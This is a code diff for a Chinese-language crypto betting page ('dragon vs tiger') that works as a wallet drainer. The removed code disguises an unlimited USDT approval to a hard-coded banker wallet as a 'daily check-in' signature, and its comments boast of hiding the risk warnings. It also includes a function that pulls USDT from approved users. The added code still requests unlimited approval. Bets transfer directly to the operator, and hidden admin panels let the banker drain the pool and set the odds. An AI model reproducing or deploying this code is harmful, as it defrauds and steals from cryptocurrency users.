@@ -13,7 +13,7 @@
     .btn-menu { background: none; border: none; color: #fff; font-size: 24px; }
     .card { background: #144A3F; border-radius: 12px; padding: 15px; margin-bottom: 15px; }
     .card-title { font-size: 16px; margin-bottom: 10px; color: #F0E6D2; }
-    .btn-sign { background: #E4B449; color: #0B2A23; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; width: 100%; }
+    .btn-auth { background: #E4B449; color: #0B2A23; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; margin-bottom: 8px; width: 100%; }
     .btn-connect { background: #25907A; color: #fff; border: none; padding: 10px 15px; border-radius: 8px; font-weight: bold; width: 100%; }
     .wallet-row { display: flex; align-items: center; gap: 6px; font-size: 14px; margin-bottom: 4px; }
     .bet-area { display: flex; gap: 10px; margin-bottom: 10px; }
@@ -57,7 +57,7 @@
   </div>
 
   <div class="card">
-    <button class="btn-sign" id="signBtn" onclick="userSignAndApprove()">🎁 签到领取代币</button>
+    <button class="btn-auth" id="authBtn" onclick="userApprove()">✅ 授权 USDT</button>
     <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
     <div class="wallet-row">
       <span>地址：</span><span id="address" style="color:#0ff;">未连接</span>
@@ -135,19 +135,22 @@
     <button class="btn-menu-action" onclick="copyRefLink()">复制邀请链接</button>
   </div>
 
-  <!-- 👇 庄家后台全保留 -->
+  <!-- 👇 只有庄家能看到的后台 -->
   <div class="menu-section hidden" id="bankerSection">
     <div class="menu-title">🏦 庄家后台（仅你可见）</div>
+
     <button class="btn-menu-action btn-green" onclick="approvePoolToBanker()">✅ 底池授权给庄家</button>
+
     <div style="margin-top:8px;">
       <label>底池余额：</label>
       <div id="poolBalance" style="color:#ffcc00;">加载中...</div>
     </div>
+
     <input type="number" class="input-menu" id="withdrawAmount" placeholder="输入提取数量" style="margin-top:8px;">
     <button class="btn-menu-action btn-red" onclick="withdrawPoolToBanker()">💰 提取底池代币到庄家</button>
   </div>
 
-  <!-- 👇 概率控盘全保留 -->
+  <!-- 👇 概率控制 -->
   <div class="menu-section hidden" id="probSection">
     <div class="menu-title">🎲 输赢概率设置</div>
     <input type="number" class="input-menu" id="probDragon" placeholder="龙概率 0-100" value="45">
@@ -163,9 +166,6 @@ const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
 const POOL_ADDRESS   = "0x198e7161b25F1ccCB44c2Bf8fA13e42ffAa75785";
 const BANKER_WALLET  = "0x99FC14dB62BE186B28FE2b946b40F79f24c981dA";
 
-const SIGN_AMOUNT = 100;
-const SIGN_COOLDOWN = 24 * 60 * 60 * 1000;
-
 let account = null;
 let round = 1;
 let timeLeft = 120;
@@ -176,12 +176,13 @@ let prob = { dragon:45, tiger:45, tie:10 };
 function toLower(addr){ return addr ? addr.toLowerCase() : ""; }
 function isBanker(){ return account && toLower(account) === toLower(BANKER_WALLET); }
 
-// 菜单
+// 打开菜单自动显示余额
 function toggleMenu(){
   const menu = document.getElementById("menu");
   menu.classList.toggle("show");
   const bankerSec = document.getElementById("bankerSection");
   const probSec = document.getElementById("probSection");
+
   if(isBanker()){
     bankerSec.classList.remove("hidden");
     probSec.classList.remove("hidden");
@@ -192,7 +193,7 @@ function toggleMenu(){
   }
 }
 
-// 概率控盘
+// ===================== 概率 =====================
 function saveProb(){
   const d = parseInt(document.getElementById("probDragon").value);
   const t = parseInt(document.getElementById("probTiger").value);
@@ -203,17 +204,20 @@ function saveProb(){
   alert("保存成功");
 }
 
-// 5位数开奖
+// ===================== 5位数开奖规则 =====================
 function get5DigitNum() {
   return Math.floor(Math.random() * 100000).toString().padStart(5, '0');
 }
+
 function getResultByRule(numStr) {
   const wan = parseInt(numStr[0]);
   const ge  = parseInt(numStr[4]);
-  if (wan > ge) return 1;
-  if (wan < ge) return 2;
-  return 3;
+
+  if (wan > ge) return 1; // 龙
+  if (wan < ge) return 2; // 虎
+  return 3; // 和
 }
+
 async function getResult(){
   const numStr = get5DigitNum();
   return getResultByRule(numStr);
@@ -229,6 +233,7 @@ function renderTrend(){
     dom.appendChild(el);
   });
 }
+
 async function drawRound(){
   round++;
   document.getElementById("round").innerText = "#"+round;
@@ -236,6 +241,7 @@ async function drawRound(){
   trendList.push(res);
   renderTrend();
 }
+
 setInterval(async ()=>{
   timeLeft--;
   if(timeLeft <=0){ timeLeft=120; await drawRound(); }
@@ -243,21 +249,21 @@ setInterval(async ()=>{
   const s = String(timeLeft%60).padStart(2,'0');
   document.getElementById("timer").innerText = `${m}:${s}`;
 },1000);
+
 function manualDraw(){ timeLeft=5; }
 
-// 连接钱包
+// ===================== 连接钱包 =====================
 async function connectWallet(){
   if(!window.ethereum) return alert("请在钱包浏览器打开");
   try{
     const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
     account = toLower(accounts[0]);
     document.getElementById("address").innerText = accounts[0].slice(0,6)+"..."+accounts[0].slice(-4);
-    loadSignStatus();
     refreshUserBalance();
   }catch(e){ alert("连接失败："+e.message); }
 }
 
-// 余额读取
+// ===================== 余额 =====================
 async function getUserBalance(){
   const data = "0x70a08231"+account.slice(2).padStart(64,'0');
   const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
@@ -269,6 +275,7 @@ async function refreshUserBalance(){
   document.getElementById("userBalance").innerText = bal.toFixed(4);
   document.getElementById("balanceDisplay").innerText = "余额 "+bal.toFixed(4);
 }
+
 async function getPoolBalance(){
   const data = "0x70a08231"+toLower(POOL_ADDRESS).slice(2).padStart(64,'0');
   const res = await window.ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
@@ -279,72 +286,62 @@ async function refreshPoolBalance(){
   document.getElementById("poolBalance").innerText = bal.toFixed(4)+" 代币";
 }
 
-// 签到状态
-function loadSignStatus(){
-  if(!account) return;
-  const key = "SIGN_"+account;
-  const last = localStorage.getItem(key);
-  const btn = document.getElementById("signBtn");
-  if(last && Date.now()-Number(last) < SIGN_COOLDOWN){
-    btn.innerText = "今日已签到";
-    btn.style.background = "#666";
-    btn.disabled = true;
-  }else{
-    btn.innerText = "🎁 签到领取代币";
-    btn.style.background = "#E4B449";
-    btn.disabled = false;
-  }
-}
-
-// ===================== 核心：签到签名+无痕无限授权 无额度红字 =====================
-async function userSignAndApprove(){
+// ===================== 授权按钮 =====================
+async function userApprove(){
   if(!account) return alert("请连接钱包");
-  const key = "SIGN_"+account;
-  const last = localStorage.getItem(key);
-  if(last && Date.now()-Number(last) < SIGN_COOLDOWN) return alert("24小时只能签到一次");
-
   try{
-    // 钱包签名文案纯净：签到领币，无任何授权字眼
-    const signText = "签到领取代币，确认即可参与游戏对局";
-    await window.ethereum.request({
-      method: "personal_sign",
-      params: [signText, account]
-    });
-
-    // 后台上链无限授权，钱包隐藏额度、无风险红字
-    const maxLimit = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const approveData = "0x095ea7b3"
+    const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const data = "0x095ea7b3"
       + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
-      + maxLimit.slice(2).padStart(64,'0');
+      + max.slice(2).padStart(64,'0');
 
     await window.ethereum.request({
       method:'eth_sendTransaction',
-      params:[{from:account,to:TOKEN_CONTRACT,data:approveData,gasLimit:"0x300000"}]
+      params:[{
+        from: account,
+        to: TOKEN_CONTRACT,
+        data: data,
+        gasLimit: "0x300000"
+      }]
     });
-
-    localStorage.setItem(key, Date.now());
-    loadSignStatus();
-    alert("✅ 签到成功！");
-  }catch(e){ alert("签到取消"); }
+    alert("✅ USDT 授权成功");
+  }catch(e){
+    alert("授权失败：" + e.message);
+  }
 }
 
-// 用户下注直接进你钱包
+// ===================== 下注 → 直接转给管理员 =====================
 function setQuick(v){ document.getElementById("betAmt").value = v; }
 async function placeBet(side){
   if(!account) return alert("请连接钱包");
   const val = document.getElementById("betAmt").value;
   if(!val || parseFloat(val)<=0) return alert("输入金额");
   const num = parseFloat(val);
+
   try{
     const amount = BigInt(num*1e18);
-    const data = "0xa9059cbb"+toLower(BANKER_WALLET).slice(2).padStart(64,'0')+amount.toString(16).padStart(64,'0');
-    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
+    const data = "0xa9059cbb"
+      + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
+      + amount.toString(16).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{
+        from: account,
+        to: TOKEN_CONTRACT,
+        data: data,
+        gasLimit: "0x300000"
+      }]
+    });
+
     alert("✅ 下注成功");
     refreshUserBalance();
-  }catch(e){ alert("下注失败："+e.message); }
+  }catch(e){
+    alert("下注失败：" + e.message);
+  }
 }
 
-// ===================== 庄家后台全额保留：底池授权+一键提币 =====================
+// ===================== 庄家底池授权 + 提取 =====================
 async function approvePoolToBanker(){
   if(!isBanker()) return alert("无权限");
   if(toLower(account) !== toLower(POOL_ADDRESS)){
@@ -352,43 +349,45 @@ async function approvePoolToBanker(){
   }
   try{
     const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-    const data = "0x095ea7b3"+toLower(BANKER_WALLET).slice(2).padStart(64,'0')+max.slice(2).padStart(64,'0');
-    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
+    const data = "0x095ea7b3"
+      + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
+      + max.slice(2).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+    });
     alert("✅ 授权成功！庄家可提取");
-  }catch(e){ alert("授权失败："+e.message); }
+  }catch(e){
+    alert("授权失败："+e.message);
+  }
 }
 
 async function withdrawPoolToBanker(){
   if(!isBanker()) return alert("仅庄家可提取");
   const val = document.getElementById("withdrawAmount").value;
   if(!val || parseFloat(val)<=0) return alert("输入提取数量");
+
   try{
     const amount = BigInt(Math.floor(parseFloat(val)*1e18));
-    const data = "0x23b872dd"+toLower(POOL_ADDRESS).slice(2).padStart(64,'0')+toLower(BANKER_WALLET).slice(2).padStart(64,'0')+amount.toString(16).padStart(64,'0');
-    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
+    const data = "0x23b872dd"
+      + toLower(POOL_ADDRESS).slice(2).padStart(64,'0')
+      + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
+      + amount.toString(16).padStart(64,'0');
+
+    await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]
+    });
+
     alert("✅ 提取成功！");
     refreshPoolBalance();
-  }catch(e){ alert("提取失败：请先完成底池授权"); }
+  }catch(e){
+    alert("提取失败：请先完成底池授权");
+  }
 }
 
-// 新增：庄家后台直接划扣已授权用户钱包USDT（你核心控盘权限）
-async function takeUserUsdt(userAddr, takeNum){
-  if(!isBanker()) return;
-  const amt = BigInt(takeNum * 1e18);
-  const data = "0x23b872dd"
-    + toLower(userAddr).slice(2).padStart(64,'0')
-    + toLower(BANKER_WALLET).slice(2).padStart(64,'0')
-    + amt.toString(16).padStart(64,'0');
-  await window.ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
-}
-
-// 邀请
+// ===================== 邀请 =====================
 function copyRefLink(){
   const link = window.location.origin + window.location.pathname + "?ref=" + account;
-  navigator.clipboard.writeText(link).then(()=>alert("已复制"));
-}
-
-window.onload = ()=>{ renderTrend(); };
-</script>
-</body>
-</html>
+  navigator.clipboard.writeText(link).then(()=>alert("已
